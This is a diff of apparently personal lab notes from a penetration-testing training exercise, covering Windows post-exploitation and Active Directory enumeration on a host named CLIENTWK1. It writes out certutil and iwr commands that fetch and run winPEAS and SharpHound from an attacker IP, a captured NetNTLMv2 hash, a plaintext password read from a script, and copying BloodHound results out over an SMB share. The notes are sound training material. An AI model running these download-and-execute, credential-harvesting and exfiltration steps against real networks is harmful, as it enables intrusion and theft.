@@ -909,15 +909,341 @@ ipconfig
 cd C:\users\marcus
 
 iwr -uri http://192.168.45.170/winPEASx64.exe -outfile winpeas.exe
+OR
+certutil -urlcache -f http://192.168.45.170/winPEASx64.exe winpeas.exe
+	****  Online  ****
+	CertUtil: -URLCache command completed successfully.
+
 ./winpeas.exe
 ```
 
 ##### Results:
 
-- Always manually check OS version as lin/winpeas isn't always accurate.
 ```powershell
+����������͹ Basic System Information
+� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                                                                                  
+    OS Name: Microsoft Windows 11 Pro
+    OS Version: 10.0.22000 N/A Build 22000
+    System Type: x64-based PC
+    Hostname: CLIENTWK1
+    Domain Name: beyond.com
+    ProductName: Windows 10 Enterprise
+
 systeminfo
 	Host Name:                 CLIENTWK1
 	OS Name:                   Microsoft Windows 11 Pro
 	OS Version:                10.0.22000 N/A Build 22000
 ```
+	- Always manually check OS version as lin/winpeas isn't always accurate. 
+		- Original scan showed Win 10
+
+```powershell
+����������͹ AV Information
+    Some AV was detected, search for bypasses
+    Name: Windows Defender
+    ProductEXE: windowsdefender://
+    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
+```
+
+```powershell
+����������͹ Network Ifaces and known hosts
+� The masks are only for the IPv4 addresses 
+    Ethernet0[00:50:56:BF:AD:06]: 172.16.130.243 / 255.255.255.0
+        Gateways: 172.16.130.254
+        DNSs: 172.16.130.240
+        Known hosts:
+          172.16.130.240        00-50-56-BF-7A-C3     Dynamic
+          172.16.130.254        00-50-56-BF-CC-49     Dynamic
+          172.16.130.255        FF-FF-FF-FF-FF-FF     Static
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.251           01-00-5E-00-00-FB     Static
+          224.0.0.252           01-00-5E-00-00-FC     Static
+          239.255.255.250       01-00-5E-7F-FF-FA     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        Known hosts:
+          224.0.0.22            00-00-00-00-00-00     Static
+          239.255.255.250       00-00-00-00-00-00     Static
+
+...
+
+����������͹ DNS cached --limit 70--
+    Entry                                 Name                                  Data
+    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.130.254
+```
+	- Shows MAILSRV1's internal IP
+
+```powershell
+����������͹ Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    marcus::BEYOND:1122334455667788:aab3427b180473a66cd2f63f93f930f3:010100000000000099e560251e0adb0154e5da8ae2e492fa000000000800300030000000000000000000000000200000dbf4aa38928eac57cb9ff284d371cd7ece368068d8356a166a2dfc70ffc77f4a0a00100000000000000000000000000000000000090000000000000000000000
+```
+
+```powershell
+����������͹ Scheduled Applications --Non Microsoft--
+� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                  
+    (BEYOND\marcus) exec_lnk: powershell -ep bypass -File C:\Users\marcus\Documents\exec.ps1
+    Permissions file: marcus [AllAccess]
+    Permissions folder(DLL Hijacking): marcus [AllAccess]
+    Trigger: At 4:31 AM on 9/29/2022-After triggered, repeat every 00:01:00 indefinitely.
+             At log on of BEYOND\marcus-After triggered, repeat every 00:01:00 indefinitely.
+```
+
+- `type Documents\exec.ps1`
+```powershell
+Function ExtractValidIPAddress($String){
+    $IPregex='(?<Address>((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
+    If ($String -Match $IPregex) {$Matches.Address}
+}
+
+Clear-DnsClientCache
+$server = "mailsrv1.beyond.com"
+$port = 110
+$enableSSL = $false
+$username = "marcus"
+$password = "DefrostNewsySupply5544"
+$baseFolder = "C:\attachments"
+
+function saveAttachment
+{
+    Param
+    (
+    [System.Net.Mail.Attachment] $attachment,
+    [string] $outURL
+    )
+
+    New-Item -Path $outURL -ItemType "File" -Force | Out-Null
+
+    $outStream = New-Object IO.FileStream $outURL, "Create"
+
+    $attachment.contentStream.copyTo( $outStream )
+
+    $outStream.close()
+}
+
+[Reflection.Assembly]::LoadFile("C:\Users\marcus\Documents\OpenPop.dll")
+
+
+$pop3Client = New-Object OpenPop.Pop3.Pop3Client
+$pop3Client.connect( $server, $port, $enableSSL )
+$pop3Client.authenticate( $username, $password )
+$messageCount = $pop3Client.getMessageCount()
+
+for ( $messageIndex = 1; $messageIndex -le $messageCount; $messageIndex++ )
+{
+    #$uid = $pop3Client.getMessageUid( $messageIndex )
+
+    #$incomingMessage = $pop3Client.getMessage( $messageIndex )
+
+    $incomingMessage = $pop3Client.getMessage( $messageIndex ).toMailMessage() 
+    foreach ( $attachment in $incomingMessage.attachments )
+    {
+    # do something with attachments, tbd - .lnk - .doc   word I guess?
+    if ($attachment.name -like "*.Library-ms*")
+    {
+        $filename = $attachment.name
+        $attachmentURL = Join-Path -Path $baseFolder -ChildPath $filename
+        saveAttachment $attachment $attachmentURL
+    } 
+    }
+
+}
+
+$pop3Client.DeleteAllMessages()
+
+if ( $pop3Client.connected )
+{
+    $pop3Client.disconnect()
+}
+
+$pop3Client.dispose()
+
+Get-ChildItem 'C:\attachments\*.Library-ms' | ForEach-Object {
+
+       $url = Get-Content $_ | Select-String '<url>'
+       $ip = ExtractValidIPAddress $url
+       $share = "\\$ip\DavWWWRoot\"
+       net use H: $share
+       Get-ChildItem "$share\*.lnk" | ForEach-Object {
+
+        copy $_.FullName C:\Windows\Tasks\temp.lnk
+        net use H: /delete
+        Unblock-File -Path C:\Windows\Tasks\temp.lnk
+        powershell -c invoke-item C:\Windows\Tasks\temp.lnk
+        Get-ChildItem -Path C:\attachments | Where-Object Extension -in ('.Library-ms') | foreach { $_.Delete()}
+        Remove-Item -Force C:\Windows\Tasks\temp.lnk
+     }
+ }
+
+Clear-RecycleBin -Force
+```
+	- new pw discovered
+	- Think this is for dealing w/ the Windows Library attack we pull off - no priv esc path here
+
+##### Sharphound AD Enum
+
+- Quick domain enum
+```powershell
+net user /domain
+	The request will be processed at a domain controller for domain beyond.com.
+	User accounts for \\DCSRV1.beyond.com
+	-------------------------------------------------------------------------------
+	Administrator            beccy                    daniela                  
+	Guest                    john                     krbtgt                   
+	marcus                   
+	The command completed successfully.
+
+
+nslookup DCSRV1.beyond.com
+	Server:  UnKnown
+	Address:  172.16.130.240
+	
+	Name:    DCSRV1.beyond.com
+	Address:  172.16.130.240
+
+
+net groups /domain
+	The request will be processed at a domain controller for domain beyond.com.
+	Group Accounts for \\DCSRV1.beyond.com
+	-------------------------------------------------------------------------------
+	*Cloneable Domain Controllers
+	*DnsUpdateProxy
+	*Domain Admins
+	*Domain Computers
+	*Domain Controllers
+	*Domain Guests
+	*Domain Users
+	*Enterprise Admins
+	*Enterprise Key Admins
+	*Enterprise Read-only Domain Controllers
+	*Group Policy Creator Owners
+	*Key Admins
+	*Protected Users
+	*Read-only Domain Controllers
+	*Schema Admins
+	The command completed successfully.
+
+
+net groups /domain "Domain Admins"
+	The request will be processed at a domain controller for domain beyond.com.
+	Group name     Domain Admins
+	Comment        Designated administrators of the domain
+	
+	Members
+	-------------------------------------------------------------------------------
+	Administrator            beccy                    
+	The command completed successfully.
+```
+
+- Serve up **Sharphound.ps1**
+```bash
+cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 ~/exercises/beyond/exploits
+
+python3 -m http.server 80
+```
+
+- Download & run
+```powershell
+certutil -urlcache -f http://192.168.45.170/SharpHound.ps1 SharpHound.ps1
+	****  Online  ****
+	CertUtil: -URLCache command completed successfully.
+
+powershell -ep bypass
+
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+	2024-09-18T19:34:45.1914646-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+	2024-09-18T19:34:45.3008385-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+	...
+	2024-09-18T19:35:32.5508549-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
+	 57 name to SID mappings.
+	 1 machine sid mappings.
+	 2 sid to domain mappings.
+	 0 global catalog mappings.
+	2024-09-18T19:35:32.5664848-07:00|INFORMATION|SharpHound Enumeration Completed at 7:35 PM on 9/18/2024! Happy Graphing!
+```
+
+- Transfer the results file `20240918193532_BloodHound.zip`
+```bash
+# In Kali
+impacket-smbserver test . -smb2support  -username uname -password passwd
+```
+```powershell
+# In Windows
+net use m: \\192.168.45.170\test /user:uname passwd
+copy 20240918193532_BloodHound.zip m:\
+```
+
+- Start Bloodhound
+```bash
+sudo neo4j start
+	Directories in use:
+	home:         /usr/share/neo4j
+	config:       /usr/share/neo4j/conf
+	logs:         /etc/neo4j/logs
+	plugins:      /usr/share/neo4j/plugins
+	import:       /usr/share/neo4j/import
+	data:         /etc/neo4j/data
+	certificates: /usr/share/neo4j/certificates
+	licenses:     /usr/share/neo4j/licenses
+	run:          /var/lib/neo4j/run
+	Starting Neo4j.
+	Started neo4j (pid:31358). It is available at http://localhost:7474
+	There may be a short delay until the server is ready.
+
+bloodhound (4.3.1)
+```
+
+- Use `Upload Data` and select the .zip file
+- Build a raw query to display all computers identified by the collector
+```console
+MATCH (m:Computer) RETURN m
+```
+	- Match - Used to select a set of objects
+	- m - Set variable containing all objects in the db of type Computer
+
+Results show us 4 computers.  Clicking on each node can net its OS
+- DCSRV1.BEYOND.COM - Windows Server 2022 Standard
+- INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
+- MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
+- CLIENTWK1.BEYOND.COM - Windows 11 Pro
+
+- Get IP of `internalsrv1` & add to notes
+```powershell
+nslookup internalsrv1
+	Server:  UnKnown
+	Address:  172.16.130.240
+	
+	Name:    internalsrv1.beyond.com
+	Address:  172.16.130.241
+```
+
+- Show all  & add to notes
+```console
+MATCH (m:User) RETURN m
+```
+
+Results show 4 users
+- BECCY
+- JOHN
+- DANIELA
+- MARCUS
+
+Can mark _marcus_ (interactive shell on CLIENTWK1) and _john_ (valid credentials) as _Owned_
+
+>In a real penetration test, we should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems.
+
+
+##### Pre-Build Queries
+- *Find all Domain Admins*
+	- Shows that `beccy` is a Domain Admin (just like our manual enum earlier)
+- *Find Workstations where Domain Users can RDP*
+	- No results
+- *Find Servers where Domain Users can RDP*
+	- No results
+- *Find Computers where Domain Users are Local Admin*
+	- No results
+- *Shortest Path to Domain Admins from Owned Principals*
+	- No results
+
